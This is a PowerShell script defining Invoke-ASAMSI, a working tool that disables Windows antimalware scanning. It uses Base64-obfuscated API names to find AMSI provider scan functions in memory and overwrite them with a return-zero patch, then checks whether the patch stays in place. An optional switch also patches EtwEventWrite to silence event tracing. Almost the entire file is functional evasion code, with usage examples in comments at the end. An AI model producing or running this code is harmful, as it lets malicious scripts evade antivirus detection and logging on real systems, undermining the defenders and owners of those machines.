function Invoke-ASAMSI {
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false)]
        [switch]$EnableVerbose,

        [Parameter(Mandatory = $false)]
        [switch]$PatchEtw
    )

    # Initialize a global list to store successfully patched addresses
    $global:AMSIPatchedAddresses = [System.Collections.Generic.List[IntPtr]]::new()
    $global:ETWPatchedAddress = [IntPtr]::Zero # Store ETW address separately

    if ($PSBoundParameters.ContainsKey('EnableVerbose') -and $EnableVerbose) {
        $VerbosePreference = "Continue"
    }

    $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($IsAdmin) {
        Write-Host "[*] Running as Admin." -ForegroundColor Yellow
    } else {
        Write-Host "[*] Running as User." -ForegroundColor Green
    }

    function Get-WinApiFunctionAddressObf {
        Param(
            [Parameter(Mandatory = $true)]
            [string]$ModName,
            [Parameter(Mandatory = $true)]
            [string]$FuncName,
            [Parameter(Mandatory = $true)]
            [System.Reflection.MethodInfo]$GetModHandleMeth,
            [Parameter(Mandatory = $true)]
            [System.Reflection.MethodInfo]$GetProcAddrMeth
        )
        $modH = $GetModHandleMeth.Invoke($null, @($ModName))
        if ($modH -eq [IntPtr]::Zero) {
            Write-Warning "Err Mod: ${ModName}"
            return $null
        }
        $dW = New-Object IntPtr
        $modHR = New-Object System.Runtime.InteropServices.HandleRef($dW, $modH)
        $funcAddr = $GetProcAddrMeth.Invoke($null, @($modHR, $FuncName))
        if ($funcAddr -eq [IntPtr]::Zero) {
             Write-Warning "Err Func: ${FuncName} in ${ModName}"
            return $null
        }
        Write-Verbose "Addr ${FuncName}: ${funcAddr}"
        return $funcAddr
    }

    function New-WinApiDelegateObf {
        Param (
            [Parameter(Position = 0, Mandatory = $true)]
            [IntPtr]$FuncPtr,
            [Parameter(Position = 1, Mandatory = $true)]
            [Type[]]$ParamTypes,
            [Parameter(Position = 2)]
            [Type]$RetType = [Void],
             [Parameter(Mandatory = $true)]
             [Type]$MarshType
        )
        $dom = [AppDomain]::CurrentDomain
        $dynAsmName = "{0}{1}" -f 'DynAsm', (Get-Random)
        $asmName = New-Object System.Reflection.AssemblyName($dynAsmName)
        $asmBuilder = $dom.DefineDynamicAssembly($asmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $modBuilder = $asmBuilder.DefineDynamicModule(("{0}{1}" -f 'DynMod', (Get-Random)), $false)
        $tBuilder = $modBuilder.DefineType(("{0}{1}" -f 'DynDel', (Get-Random)), 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ctorBuilder = $tBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParamTypes)
        $ctorBuilder.SetImplementationFlags('Runtime, Managed')
        $mBuilder = $tBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $RetType, $ParamTypes)
        $mBuilder.SetImplementationFlags('Runtime, Managed')
        $delType = $tBuilder.CreateType()
        $gdm = $MarshType.GetMethod("GetDelegateForFunctionPointer", [System.Reflection.BindingFlags]'Public, Static', $null, @([IntPtr], [Type]), $null)
        if (-not $gdm) { Throw "Err GDM" }
        $del = $gdm.Invoke($null, @($FuncPtr, $delType))
        Write-Verbose "Del created: ${FuncPtr}"
        return $del
    }

    Write-Host "[*] Starting..." -ForegroundColor Cyan

    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Write-Verbose "[*] WinForms loaded."
    }
    catch {
        Throw "[!] Failed WinForms load."
    }

    $MarshalType = [System.Runtime.InteropServices.Marshal]
    $UnsafeMethodsType = [Windows.Forms.Form].Assembly.GetType(('System.Windows.Forms' + '.UnsafeNativeMethods'))
    if (-not $UnsafeMethodsType) {
        Throw "[!] Failed UnsafeMethods GetType."
    }

    # Obfuscated strings using Base64
    $b64GetProcAddress = "R2V0UHJvY0FkZHJlc3M=" # GetProcAddress
    $b64GetModuleHandle = "R2V0TW9kdWxlSGFuZGxl" # GetModuleHandle
    $b64AmsiInitialize = "QW1zaUluaXRpYWxpemU=" # AmsiInitialize
    $b64AmsiDll = "YW1zaS5kbGw=" # amsi.dll
    $b64Kernel32Dll = "a2VybmVsMzIuZGxs" # kernel32.dll
    $b64VirtualProtect = "VmlydHVhbFByb3RlY3Q=" # VirtualProtect
    $b64NtdllDll = "bnRkbGwuZGxs" # ntdll.dll
    $b64EtwEventWrite = "RXR3RXZlbnRXcml0ZQ==" # EtwEventWrite

    $enc = [System.Text.Encoding]::ASCII
    $GetProcAddressFunctionName = $enc.GetString([System.Convert]::FromBase64String($b64GetProcAddress))
    $GetModuleHandleFunctionName = $enc.GetString([System.Convert]::FromBase64String($b64GetModuleHandle))
    $AmsiInitializeFunctionName = $enc.GetString([System.Convert]::FromBase64String($b64AmsiInitialize))
    $AmsiModuleName = $enc.GetString([System.Convert]::FromBase64String($b64AmsiDll))
    $Kernel32ModuleName = $enc.GetString([System.Convert]::FromBase64String($b64Kernel32Dll))
    $VirtualProtectFunctionName = $enc.GetString([System.Convert]::FromBase64String($b64VirtualProtect))
    $NtdllModuleName = $enc.GetString([System.Convert]::FromBase64String($b64NtdllDll))
    $EtwEventWriteFunctionName = $enc.GetString([System.Convert]::FromBase64String($b64EtwEventWrite))

    $GetModuleHandleMethod = $UnsafeMethodsType.GetMethod($GetModuleHandleFunctionName, [System.Reflection.BindingFlags]'Static, Public, NonPublic')
    $GetProcAddressMethod = $UnsafeMethodsType.GetMethod($GetProcAddressFunctionName, [System.Reflection.BindingFlags]'Static, Public, NonPublic')

    if (-not $GetModuleHandleMethod) { Throw "[!] Err GMH MethodInfo." }
    Write-Verbose "[*] GMH: $($GetModuleHandleMethod.Name)"
    if (-not $GetProcAddressMethod) { Throw "[!] Err GPA MethodInfo." }
    Write-Verbose "[*] GPA: $($GetProcAddressMethod.Name)"

    $AmsiInitializeAddress = Get-WinApiFunctionAddressObf -ModName $AmsiModuleName -FuncName $AmsiInitializeFunctionName -GetModHandleMeth $GetModuleHandleMethod -GetProcAddrMeth $GetProcAddressMethod
    if ($AmsiInitializeAddress -eq [IntPtr]::Zero) { Throw "[!] Err AI Addr." }
    Write-Verbose "[*] AI Addr: ${AmsiInitializeAddress}"

    $PointerSize = $MarshalType::SizeOf([Type][IntPtr])
    Write-Verbose "[*] Ptr Size: ${PointerSize}."

    $AmsiInitializeDelegate = $null
    if ($PointerSize -eq 8) {
        $AmsiInitializeDelegate = New-WinApiDelegateObf -FuncPtr $AmsiInitializeAddress -ParamTypes @([string], [UInt64].MakeByRefType()) -RetType ([Int]) -MarshType $MarshalType
        [UInt64]$AmsiContext = 0
    } else {
        $AmsiInitializeDelegate = New-WinApiDelegateObf -FuncPtr $AmsiInitializeAddress -ParamTypes @([string], [IntPtr].MakeByRefType()) -RetType ([Int]) -MarshType $MarshalType
        [IntPtr]$AmsiContext = [IntPtr]::Zero
    }
     if (-not $AmsiInitializeDelegate) { Throw "[!] Failed AI Delegate." }

    $VirtualProtectAddress = Get-WinApiFunctionAddressObf -ModName $Kernel32ModuleName -FuncName $VirtualProtectFunctionName -GetModHandleMeth $GetModuleHandleMethod -GetProcAddrMeth $GetProcAddressMethod
    if ($VirtualProtectAddress -eq [IntPtr]::Zero) { Throw "[!] Err VP Addr." }
    Write-Verbose "[*] VP Addr: ${VirtualProtectAddress}"

    $VirtualProtectDelegate = New-WinApiDelegateObf -FuncPtr $VirtualProtectAddress -ParamTypes @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -RetType ([Bool]) -MarshType $MarshalType
     if (-not $VirtualProtectDelegate) { Throw "[!] Failed VP Delegate." }
    Write-Verbose "[*] VP Delegate created."

    $ProtVal1 = 32
    $ProtVal2 = 32
    $PAGE_EXECUTE_READWRITE = $ProtVal1 + $ProtVal2

    $OldProtection = 0
    $AmsiPatchBytes = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
    $PatchSize = $AmsiPatchBytes.Length

    Write-Verbose "[*] Calling AmsiInitialize..."
    $HResult = $AmsiInitializeDelegate.Invoke(("PS_" + "Bypass"), [ref]$AmsiContext)
    Write-Verbose "[*] AI HResult: ${HResult}, Context: ${AmsiContext}"
    if ($HResult -ne 0) {
        if (($PointerSize -eq 8 -and $AmsiContext -eq 0) -or ($PointerSize -ne 8 -and $AmsiContext -eq [IntPtr]::Zero)) {
            Write-Warning "[!] AI failed, no context."
            return
        } else {
             Write-Warning "[!] AI HResult: ${HResult}, Context: ${AmsiContext}. Proceeding."
        }
    }
     elseif (($PointerSize -eq 8 -and $AmsiContext -eq 0) -or ($PointerSize -ne 8 -and $AmsiContext -eq [IntPtr]::Zero)) {
         Write-Host "[*] AI OK, no context (no providers?)." -ForegroundColor Green
         if ($PatchEtw) { Write-Host "[*] Proceeding ETW." -ForegroundColor Cyan }
         return
     }
    Write-Host "[*] Context: ${AmsiContext}" -ForegroundColor Cyan

    $ProviderListAddress = [IntPtr]::Zero
    $CAmsiAntimalwarePtr = [IntPtr]::Zero
    $AmsiContextPtr = [IntPtr]::Zero
    $ProviderOffset = 0
    $ProviderListOffset = 0

    Write-Verbose "[*] Attempting to find provider list..."
    try {
        if ($PointerSize -eq 8) { # 64-bit
            $ProviderOffset = 16
            $ProviderListOffset = 64
            $AmsiContextPtr = [IntPtr]::new([Int64]$AmsiContext)
            Write-Verbose "[*] Reading CAmsiAntimalwarePtr from Context ${AmsiContextPtr} + Offset ${ProviderOffset}"
            $CAmsiAntimalwarePtr = $MarshalType::ReadIntPtr($AmsiContextPtr, $ProviderOffset)
             if ($CAmsiAntimalwarePtr -eq [IntPtr]::Zero) { Throw "CAMSI Ptr Null." }
             Write-Verbose "[*] CAmsiAntimalwarePtr: ${CAmsiAntimalwarePtr}"
             Write-Verbose "[*] Reading ProviderListAddress from CAmsiAntimalwarePtr ${CAmsiAntimalwarePtr} + Offset ${ProviderListOffset}"
            $ProviderListAddress = $MarshalType::ReadIntPtr($CAmsiAntimalwarePtr, $ProviderListOffset)
        } else { # 32-bit
            $ProviderOffset = 8
            $ProviderListOffset = 36
            $AmsiContextPtr = $AmsiContext
            Write-Verbose "[*] Reading CAmsiAntimalwarePtr from Context ${AmsiContextPtr} + Offset ${ProviderOffset}"
            $CAmsiAntimalwarePtr = $MarshalType::ReadIntPtr($AmsiContextPtr, $ProviderOffset)
             if ($CAmsiAntimalwarePtr -eq [IntPtr]::Zero) { Throw "CAMSI Ptr Null." }
             Write-Verbose "[*] CAmsiAntimalwarePtr: ${CAmsiAntimalwarePtr}"
             Write-Verbose "[*] Reading ProviderListAddress from CAmsiAntimalwarePtr ${CAmsiAntimalwarePtr} + Offset ${ProviderListOffset}"
            $ProviderListAddress = $MarshalType::ReadIntPtr($CAmsiAntimalwarePtr, $ProviderListOffset)
        }

         if ($ProviderListAddress -eq [IntPtr]::Zero) {
            Write-Host "[*] Provider list null (Address read was Zero)." -ForegroundColor Yellow
             if ($PatchEtw) { Write-Host "[*] Proceeding ETW." -ForegroundColor Cyan }
            return
         }
        Write-Verbose "[*] Provider list addr found: ${ProviderListAddress}"
    } catch {
        Throw "[!] Err reading provider list: $($_.Exception.Message)"
    }

    $ProviderIndex = 0
    $CurrentProviderAddress = $ProviderListAddress
    $PatchSuccessCount = 0
    $RevertedPatchDetected = $false # Flag to track reversion

    Write-Verbose "[*] Starting provider loop..."
    while ($CurrentProviderAddress -ne [IntPtr]::Zero) {
        Write-Verbose "Provider #${ProviderIndex} at ${CurrentProviderAddress}"
        $ProviderScanFunctionAddress = [IntPtr]::Zero
        $ProviderVTablePtr = [IntPtr]::Zero
        $ScanFuncOffset = 0
        $originalBytes = $null # To store original bytes

        try {
            if ($PointerSize -eq 8) { # 64-bit
                $ScanFuncOffset = 24
                Write-Verbose "[*] Reading VTable Ptr from Provider Addr ${CurrentProviderAddress}"
                $ProviderVTablePtr = $MarshalType::ReadIntPtr($CurrentProviderAddress)
                 if ($ProviderVTablePtr -eq [IntPtr]::Zero) { Throw "VTable Ptr Null @ ${CurrentProviderAddress}." }
                 Write-Verbose "[*] Provider VTable Ptr: ${ProviderVTablePtr}"
                 Write-Verbose "[*] Reading Scan Func Addr from VTable ${ProviderVTablePtr} + Offset ${ScanFuncOffset}"
                $ProviderScanFunctionAddress = $MarshalType::ReadIntPtr($ProviderVTablePtr, $ScanFuncOffset)
            } else { # 32-bit
                $ScanFuncOffset = 12
                Write-Verbose "[*] Reading VTable Ptr from Provider Addr ${CurrentProviderAddress}"
                $ProviderVTablePtr = $MarshalType::ReadIntPtr($CurrentProviderAddress)
                 if ($ProviderVTablePtr -eq [IntPtr]::Zero) { Throw "VTable Ptr Null @ ${CurrentProviderAddress}." }
                 Write-Verbose "[*] Provider VTable Ptr: ${ProviderVTablePtr}"
                 Write-Verbose "[*] Reading Scan Func Addr from VTable ${ProviderVTablePtr} + Offset ${ScanFuncOffset}"
                $ProviderScanFunctionAddress = $MarshalType::ReadIntPtr($ProviderVTablePtr, $ScanFuncOffset)
            }
            Write-Verbose "[*] Found potential Scan Func Addr: ${ProviderScanFunctionAddress}"

            if ($ProviderScanFunctionAddress -eq [IntPtr]::Zero) {
                Write-Warning "[!] Scan func null for #${ProviderIndex} at ${CurrentProviderAddress}. Skipping."
                 Write-Warning "[!] Stopping loop after null scan func."
                 break
            }
            Write-Host "[${ProviderIndex}] Scan func: ${ProviderScanFunctionAddress}" -ForegroundColor Cyan

            # --- Patching Process ---
            Write-Verbose "[*] Changing prot for ${ProviderScanFunctionAddress}"
            if (-not $VirtualProtectDelegate.Invoke($ProviderScanFunctionAddress, [uint32]$PatchSize, $PAGE_EXECUTE_READWRITE, [ref]$OldProtection)) {
                Throw "[!] VP failed change prot @ ${ProviderScanFunctionAddress}. Code: $($MarshalType::GetLastWin32Error())"
            }
            Write-Verbose "[*] Old prot: ${OldProtection}"

            # Read original bytes before patching
            Write-Verbose "[*] Reading original bytes @ ${ProviderScanFunctionAddress}..."
            $originalBytes = New-Object byte[] $PatchSize
            $MarshalType::Copy($ProviderScanFunctionAddress, $originalBytes, 0, $PatchSize)
            Write-Verbose "[*] Original Bytes: $($originalBytes -join ', ')"

            Write-Verbose "[*] Writing patch to ${ProviderScanFunctionAddress}..."
            $MarshalType::Copy($AmsiPatchBytes, 0, $ProviderScanFunctionAddress, $PatchSize)

            # --- Initial Verification ---
            Write-Verbose "[*] Verifying patch immediately @ ${ProviderScanFunctionAddress}..."
            $VerificationFailed = $false
            $bytesAfterPatch = New-Object byte[] $PatchSize
            $MarshalType::Copy($ProviderScanFunctionAddress, $bytesAfterPatch, 0, $PatchSize)

            if ((Compare-Object $bytesAfterPatch $AmsiPatchBytes -SyncWindow 0)) {
                 Write-Error "[!] Initial Patch verify failed @ ${ProviderScanFunctionAddress}! Bytes: $($bytesAfterPatch -join ', ')"
                 $VerificationFailed = $true
            }

            if ($VerificationFailed) {
                 Write-Verbose "[*] Restoring prot after initial verify fail..."
                 $VirtualProtectDelegate.Invoke($ProviderScanFunctionAddress, [uint32]$PatchSize, $OldProtection, [ref]$OldProtection) | Out-Null
                 Throw "[!] Initial Patch verify failed @ ${ProviderScanFunctionAddress}."
            } else {
                 Write-Verbose "[*] Initial Patch verified successfully @ ${ProviderScanFunctionAddress}."
                 $PatchSuccessCount++
                 # ADD: Store successfully patched address globally
                 $global:AMSIPatchedAddresses.Add($ProviderScanFunctionAddress)
                 Write-Verbose "[*] Added ${ProviderScanFunctionAddress} to global:AMSIPatchedAddresses"
            }

            # --- Wait and Re-Verify ---
            $sleepSeconds = 2
            Write-Host "[*] Waiting ${sleepSeconds} seconds to check for patch reversion..." -ForegroundColor Yellow
            Start-Sleep -Seconds $sleepSeconds

            Write-Verbose "[*] Re-verifying patch after sleep @ ${ProviderScanFunctionAddress}..."
            $bytesAfterSleep = New-Object byte[] $PatchSize
            $MarshalType::Copy($ProviderScanFunctionAddress, $bytesAfterSleep, 0, $PatchSize)
            Write-Verbose "[*] Bytes after sleep: $($bytesAfterSleep -join ', ')"

            # Compare after sleep
            if (-not (Compare-Object $bytesAfterSleep $AmsiPatchBytes -SyncWindow 0)) {
                 Write-Host "[+] Patch for Provider #${ProviderIndex} appears to have PERSISTED after ${sleepSeconds} seconds." -ForegroundColor Green
            } elseif (-not (Compare-Object $bytesAfterSleep $originalBytes -SyncWindow 0)) {
                 Write-Warning "[!] Patch for Provider #${ProviderIndex} appears to have been REVERTED to original bytes after ${sleepSeconds} seconds!"
                 $RevertedPatchDetected = $true
                 # Remove from global list if reverted
                 if ($global:AMSIPatchedAddresses.Contains($ProviderScanFunctionAddress)) {
                    $global:AMSIPatchedAddresses.Remove($ProviderScanFunctionAddress)
                    Write-Verbose "[*] Removed reverted address ${ProviderScanFunctionAddress} from global:AMSIPatchedAddresses"
       
                 }
            } else {
                 Write-Warning "[!] Memory for Provider #${ProviderIndex} was modified to UNEXPECTED bytes after ${sleepSeconds} seconds! Bytes: $($bytesAfterSleep -join ', ')"
                 $RevertedPatchDetected = $true # Treat unexpected modification as a failure/reversion
                 # Remove from global list if modified unexpectedly
                 if ($global:AMSIPatchedAddresses.Contains($ProviderScanFunctionAddress)) {
                    $global:AMSIPatchedAddresses.Remove($ProviderScanFunctionAddress)
                    Write-Verbose "[*] Removed unexpectedly modified address ${ProviderScanFunctionAddress} from global:AMSIPatchedAddresses"
                 }
            }

            # --- Restore Original Protection ---
            Write-Verbose "[*] Restoring original prot for ${ProviderScanFunctionAddress}"
            if (-not $VirtualProtectDelegate.Invoke($ProviderScanFunctionAddress, [uint32]$PatchSize, $OldProtection, [ref]$OldProtection)) {
                Write-Warning "[!] VP failed restore prot @ ${ProviderScanFunctionAddress}. Code: $($MarshalType::GetLastWin32Error())"
            }
            Write-Verbose "[*] Provider #${ProviderIndex} patch attempt finished."

        } catch {
            Write-Error "[!] Err processing provider #${ProviderIndex} @ ${CurrentProviderAddress}: $($_.Exception.Message)"
            Write-Warning "[!] Stopping loop due to error."
            # Attempt to restore protection if $OldProtection was set and address is known
            if ($ProviderScanFunctionAddress -ne [IntPtr]::Zero -and $OldProtection -ne 0) {
                 Write-Verbose "[*] Attempting protection restore after error..."
                 $VirtualProtectDelegate.Invoke($ProviderScanFunctionAddress, [uint32]$PatchSize, $OldProtection, [ref]$OldProtection) | Out-Null
            }
            break
        }

        # --- Move to next provider ---
        $ProviderIndex++
        Write-Verbose "valor Global VAr ${global:AMSIPatchedAddresses}"
        Write-Verbose "Moving to next provider (Index ${ProviderIndex})..."
        try {
             if ($CAmsiAntimalwarePtr -eq [IntPtr]::Zero) { Throw "CAmsiAntimalwarePtr invalid for next provider lookup." }
             $NextProviderListEntryOffset = $ProviderListOffset + ($ProviderIndex * $PointerSize)
             Write-Verbose "[*] Reading next Provider Addr from CAmsiAntimalwarePtr ${CAmsiAntimalwarePtr} + Offset ${NextProviderListEntryOffset}"
             $CurrentProviderAddress = $MarshalType::ReadIntPtr($CAmsiAntimalwarePtr, $NextProviderListEntryOffset)
             Write-Verbose "Next provider addr: ${CurrentProviderAddress}"
        } catch {
             Write-Warning "[!] Err reading next provider: $($_.Exception.Message). End of list?"
             $CurrentProviderAddress = [IntPtr]::Zero
        }
    } # End while loop

    Write-Verbose "[*] Exited provider loop."

    # --- Final Status Report ---
    if ($PatchSuccessCount -gt 0 -and -not $RevertedPatchDetected) {
        Write-Host "[*] AMSI Patched (${PatchSuccessCount} providers initially verified) and patch PERSISTED after delay check." -ForegroundColor Green
    } elseif ($PatchSuccessCount -gt 0 -and $RevertedPatchDetected) {
        Write-Warning "[!] AMSI Patched (${PatchSuccessCount} providers initially verified) BUT patch was REVERTED or MODIFIED after delay check!"
    } elseif ($ProviderIndex -gt 0) {
         Write-Host "[*] AMSI patch loop ran for ${ProviderIndex} providers but initial verification failed or errors occurred." -ForegroundColor Yellow
    } elseif ($ProviderListAddress -ne [IntPtr]::Zero) {
         Write-Host "[*] AMSI provider list found but loop didn't run or find valid scan functions." -ForegroundColor Yellow
    } else {
         Write-Host "[*] AMSI provider list not found or was null." -ForegroundColor Yellow
    }

    # --- ETW Patching (Optional) ---
    if ($PatchEtw) {
        Write-Host "[*] Starting ETW Patch..." -ForegroundColor Cyan
        $EtwEventWriteAddress = Get-WinApiFunctionAddressObf -ModName $NtdllModuleName -FuncName $EtwEventWriteFunctionName -GetModHandleMeth $GetModuleHandleMethod -GetProcAddrMeth $GetProcAddressMethod
        if ($EtwEventWriteAddress -eq [IntPtr]::Zero) {
            Write-Warning "[!] Err ETW Addr. Skipping ETW patch."
        } else {
            Write-Verbose "[*] ETW Addr: ${EtwEventWriteAddress}"
            $EtwPatchBytes = [byte[]](0xC3)
            $EtwPatchSize = $EtwPatchBytes.Length
            $EtwOldProtection = 0
            Write-Verbose "[*] Changing ETW prot @ ${EtwEventWriteAddress}"
            if (-not $VirtualProtectDelegate.Invoke($EtwEventWriteAddress, [uint32]$EtwPatchSize, $PAGE_EXECUTE_READWRITE, [ref]$EtwOldProtection)) {
                Write-Warning "[!] VP failed change ETW prot @ ${EtwEventWriteAddress}. Code: $($MarshalType::GetLastWin32Error()). Skipping."
            } else {
                 try {
                     $originalEtwBytes = New-Object byte[] $EtwPatchSize
                     $MarshalType::Copy($EtwEventWriteAddress, $originalEtwBytes, 0, $EtwPatchSize)
                     Write-Verbose "[*] Original ETW Bytes: $($originalEtwBytes -join ', ')"
                     Write-Verbose "[*] Writing ETW patch @ ${EtwEventWriteAddress}..."
                     $MarshalType::Copy($EtwPatchBytes, 0, $EtwEventWriteAddress, $EtwPatchSize)
                     Write-Verbose "[*] Verifying ETW patch @ ${EtwEventWriteAddress}..."
                     $EtwVerificationFailed = $false
                     $etwBytesAfterPatch = New-Object byte[] $EtwPatchSize
                     $MarshalType::Copy($EtwEventWriteAddress, $etwBytesAfterPatch, 0, $EtwPatchSize)
                     if ((Compare-Object $etwBytesAfterPatch $EtwPatchBytes -SyncWindow 0)) {
                         Write-Error "[!] Initial ETW Patch verify failed @ ${EtwEventWriteAddress}! Bytes: $($etwBytesAfterPatch -join ', ')"
                         $EtwVerificationFailed = $true
                     }

                     # (Optional: Add Start-Sleep and re-verify ETW patch here if needed)

                     Write-Verbose "[*] Restoring ETW prot @ ${EtwEventWriteAddress}"
                     if (-not $VirtualProtectDelegate.Invoke($EtwEventWriteAddress, [uint32]$EtwPatchSize, $EtwOldProtection, [ref]$EtwOldProtection)) {
                         Write-Warning "[!] VP failed restore ETW prot @ ${EtwEventWriteAddress}. Code: $($MarshalType::GetLastWin32Error())"
                     }

                     if ($EtwVerificationFailed) {
                          Write-Warning "[!] ETW patch initial verify failed @ ${EtwEventWriteAddress}."
                     } else {
                          Write-Verbose "[*] ETW Patch initially verified."
                          Write-Host "[*] ETW (${EtwEventWriteFunctionName}) patched (initial verification OK)." -ForegroundColor Green
                          # ADD: Store successfully patched ETW address globally
                          $global:ETWPatchedAddress = $EtwEventWriteAddress
                          Write-Verbose "[*] Stored ${EtwEventWriteAddress} to global:ETWPatchedAddress"
                     }
                 } catch {
                     Write-Warning "[!] Failed write ETW patch @ ${EtwEventWriteAddress}: $($_.Exception.Message). Skipping."
                     Write-Verbose "[*] Attempting restore ETW prot after write fail..."
                     if ($EtwOldProtection -ne 0) {
                        $VirtualProtectDelegate.Invoke($EtwEventWriteAddress, [uint32]$EtwPatchSize, $EtwOldProtection, [ref]$EtwOldProtection) | Out-Null
                     }
                 }
            }
        }
    }

    Write-Host "[*] Finished." -ForegroundColor Green
}

# --- Example Usage ---
# Uncomment to run:
# Invoke-ASAMSI -EnableVerbose
# Invoke-ASAMSI -PatchEtw -EnableVerbose

# Write-Host "[DEBUG] Invoke-ASAMSI function definition complete." -ForegroundColor Magenta # Removed debug message
